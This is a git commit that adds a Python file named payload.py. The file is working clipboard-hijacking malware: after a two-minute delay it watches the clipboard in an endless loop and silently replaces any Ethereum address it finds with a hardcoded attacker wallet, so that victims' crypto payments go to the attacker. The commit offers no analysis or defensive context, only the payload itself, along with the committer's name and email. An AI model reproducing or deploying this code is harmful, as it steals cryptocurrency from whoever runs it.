a14efbfb1f41950b8520fec2b5aa129096a28269
Luan Simões <timpsembs.7@gmail.com>
2022-03-21 14:45:36 -0300

    initial commit

---
+++ modules/payload.py
@@ -0,0 +1,15 @@
+import re
+import pyperclip
+import time
+
+
+time.sleep(120)
+
+
+eth_wallet = "0x11b0460655d3adb495943547dcb99f868c56f3a1"
+
+while True:
+    s = pyperclip.paste()
+
+    if re.match(r'0x[a-fA-F0-9]{40}', s):
+        pyperclip.copy(eth_wallet) 
